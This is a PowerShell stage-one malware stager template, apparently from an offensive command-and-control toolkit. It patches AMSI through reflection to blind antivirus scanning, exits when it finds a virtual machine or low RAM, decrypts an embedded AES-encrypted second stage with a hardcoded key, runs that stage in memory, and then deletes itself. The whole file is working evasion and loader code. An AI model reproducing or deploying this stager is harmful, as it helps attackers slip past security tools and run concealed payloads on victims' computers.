# stagers/powershell/template.ps1

# ===================
# ⚠️ STAGE 1 PAYLOAD
# AES-256-CBC Decryption + Anti-VM + AMSI Bypass
# ===================

# --- AMSI Bypass (runtime, no IEX)
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Fld = $Ref.GetField('amsiInitFailed','NonPublic,Static')
$Fld.SetValue($null,$true)

# --- Anti-VM checks
try {
    $man = (Get-WmiObject Win32_ComputerSystem).Manufacturer
    $ram = (Get-WmiObject Win32_OperatingSystem).TotalVisibleMemorySize
    if ($man -match "VMware|VirtualBox|KVM|Xen") { exit }
    if ($ram -lt 4000000) { exit }  # <4GB
} catch {}

# --- AES Decryption of Stage 2 (10b1617b3e4f6adb0bc8366ac53356ee:K7QTtFpfhHn8CSdLRyRy/ocrnNXxhp6sCJJa5evymx2V7oTcn3dZA6pY/0gltlUeKPTop5sSZEetzTBPOAqygqNJJ23t1do9dxa4vsfNydqf7FKwtqGXKDj2ctcImo/AcZCS+5GnD9IEqatrmlSdfkR/zP/b7r7DJJINYLPrDIZR+Pn9Y71sVRri5J7AgX4EkkysNawQmJcU9bBWvF5mmiuo5SyMKC8xZc2uDBQQ284BVcEorxKj9gpmDGsvrKHPGUs3LNCDRi30ZbrmJGKAjDyTQbOBu+W2wkdeFmwnIol2yU6sGFVBwEc9caBryeCd7ZIhuxg97oLcP96chLnWCBAEXdzP9MmW0YYV7HSsz0iCa0f7ITU0chPDgm+CCOVfOnt/Depxj9Tx0dwhTtnEC5xfAlXfuhqhj1BMYqP8XOq/dcs0dpm0F8T3FHfx0iBX8SqBjscXVyKDLRTxfGFz7MPq34tMEM9RK4XXTdzyxbCPl2qIeP5YCgYLWwGBoy35JiCXpI4uK0AxQgacHEDQiogdgKJw76K9B7DmKdPJPP5fk9FnfUBr0cWx66T8vDVNtpEV2SZPKn6zqegnIPGFYOHvocR7t0Lv8PgTNAeZo/zJPm15wIZLUsEMDY58Pk50ZbhBvu96PJrA2vAVyU4RmNJGB/j1NEn9zTqfLLj65dE+98tSJgooQEy85Gf21n8XBArfwrP8QJaXXJNOh3rio1+E/A3raI96vgaeutR+ysS9bWWR+NICdxswv3uwccwWeKJ62x7YJ3KbVLIlq24OCuxrnHmUNUghWf0P/5aAqT/xYZy76n4RVQV9WfCEaqVDB2xQ504gvaprxNTYBRkVeH75e7uwp/F0AsUgjUGw9IBzlo/dXDHpZqlXMIYxwZ8RYwbhSE7ku2QPsMNWC6tbbtrGrmwi3utrwm5zcaT1YG05IP+Jd3vbE9HSR8IsEx4Nei9o1IcZVTqkeDY1zaADOVpVAW9IC/s944gK4Q/3Y6ys4W2godaYh8P/D6ZZedAJ+fvK53PYhLwkQYX4PqqU8459P5kOxGqLKHy4UqiInjYQG8N+pRcwVlfL9GdUp3A8UqGydy6QIlfRhP+elMsLt4/qKZ/Qe3D/Dkevtp9kNQBqGM23cRzeBRobuvZDZJ8l)
$enc = "10b1617b3e4f6adb0bc8366ac53356ee:K7QTtFpfhHn8CSdLRyRy/ocrnNXxhp6sCJJa5evymx2V7oTcn3dZA6pY/0gltlUeKPTop5sSZEetzTBPOAqygqNJJ23t1do9dxa4vsfNydqf7FKwtqGXKDj2ctcImo/AcZCS+5GnD9IEqatrmlSdfkR/zP/b7r7DJJINYLPrDIZR+Pn9Y71sVRri5J7AgX4EkkysNawQmJcU9bBWvF5mmiuo5SyMKC8xZc2uDBQQ284BVcEorxKj9gpmDGsvrKHPGUs3LNCDRi30ZbrmJGKAjDyTQbOBu+W2wkdeFmwnIol2yU6sGFVBwEc9caBryeCd7ZIhuxg97oLcP96chLnWCBAEXdzP9MmW0YYV7HSsz0iCa0f7ITU0chPDgm+CCOVfOnt/Depxj9Tx0dwhTtnEC5xfAlXfuhqhj1BMYqP8XOq/dcs0dpm0F8T3FHfx0iBX8SqBjscXVyKDLRTxfGFz7MPq34tMEM9RK4XXTdzyxbCPl2qIeP5YCgYLWwGBoy35JiCXpI4uK0AxQgacHEDQiogdgKJw76K9B7DmKdPJPP5fk9FnfUBr0cWx66T8vDVNtpEV2SZPKn6zqegnIPGFYOHvocR7t0Lv8PgTNAeZo/zJPm15wIZLUsEMDY58Pk50ZbhBvu96PJrA2vAVyU4RmNJGB/j1NEn9zTqfLLj65dE+98tSJgooQEy85Gf21n8XBArfwrP8QJaXXJNOh3rio1+E/A3raI96vgaeutR+ysS9bWWR+NICdxswv3uwccwWeKJ62x7YJ3KbVLIlq24OCuxrnHmUNUghWf0P/5aAqT/xYZy76n4RVQV9WfCEaqVDB2xQ504gvaprxNTYBRkVeH75e7uwp/F0AsUgjUGw9IBzlo/dXDHpZqlXMIYxwZ8RYwbhSE7ku2QPsMNWC6tbbtrGrmwi3utrwm5zcaT1YG05IP+Jd3vbE9HSR8IsEx4Nei9o1IcZVTqkeDY1zaADOVpVAW9IC/s944gK4Q/3Y6ys4W2godaYh8P/D6ZZedAJ+fvK53PYhLwkQYX4PqqU8459P5kOxGqLKHy4UqiInjYQG8N+pRcwVlfL9GdUp3A8UqGydy6QIlfRhP+elMsLt4/qKZ/Qe3D/Dkevtp9kNQBqGM23cRzeBRobuvZDZJ8l"
$parts = $enc -split ':'
$ivHex = $parts[0]
$iv = for ($i = 0; $i -lt $ivHex.Length; $i += 2) { [Convert]::ToByte($ivHex.Substring($i,2),16) }
$cipherBytes = [Convert]::FromBase64String($parts[1])

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.KeySize = 256
$AES.BlockSize = 128

# 🔐 AES Key must match .env ENCRYPTION_KEY
$key = [Text.Encoding]::UTF8.GetBytes("Zxcvbnm1234567890Zxcvbnm12345678")
$AES.Key = $key
$AES.IV = $iv
$Decryptor = $AES.CreateDecryptor()
$ms = New-Object IO.MemoryStream(,$cipherBytes)
$cs = New-Object Security.Cryptography.CryptoStream($ms, $Decryptor, 'Read')
$sr = New-Object IO.StreamReader($cs)
$stage2 = $sr.ReadToEnd()

# --- Run Stage 2 in memory
$ScriptBlock = [ScriptBlock]::Create($stage2)
Invoke-Command -ScriptBlock $ScriptBlock

# --- Optional self-delete
try {
    $me = $MyInvocation.MyCommand.Path
    Remove-Item $me -Force
} catch {}
